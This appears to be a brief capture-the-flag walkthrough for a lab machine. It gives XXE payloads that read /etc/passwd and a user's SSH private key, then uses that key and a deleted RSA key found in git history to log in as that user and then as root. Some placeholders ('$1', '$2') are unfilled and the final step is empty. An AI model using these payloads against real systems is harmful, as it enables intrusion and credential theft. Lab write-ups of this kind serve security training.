Step 1 (Enumeration)
- target has ports 22 (SSH),5000 (HTTP) open
- gobuster shows /upload directory
- /upload directory is for XML script upload
- sending the XML script through burp we can edit the script easily and send to the target

Step 2 (Foot hold)
- using $1 we enumerate the users on the system.
- $1
- <?xml version="1.0" encoding="UTF-8"?>
- <!DOCTYPE root [<!ELEMENT foo ANY >
- <!ENTITY file SYSTEM "file:///etc/passwd">]>
- <root>
-   <Author>&file;</Author>
-   <Subject>ufgh</Subject>
-   <Content>bob</Content>
- </root>
- as SSH port is open using $2 we see the private SSH rsa key.
- <?xml version="1.0" encoding="UTF-8"?>
- <!DOCTYPE root [<!ELEMENT foo ANY >
- <!ENTITY file SYSTEM "file:///home/roosa/.ssh/id_rsa">]>
- <root>
-   <Author>&file;</Author>
-   <Subject>ufgh</Subject>
-   <Content>bob</Content>
- </root>
- With the privat key we just login using the syntax 'ssh -i rsa.key roosa@10.10.10.91

Step 3 (Enumeration)
- through seeing the users bash history we see they use git commands
- using 'git log -p' we see the developer has added then deleted an RSA key

Step 4 (Priviledge escalation)
- The RSA key which the user has deleted is the copied to our system and used with this syntax 'ssh -i rsa.key root@10.10.10.91'

Step 5 (Pilfering)
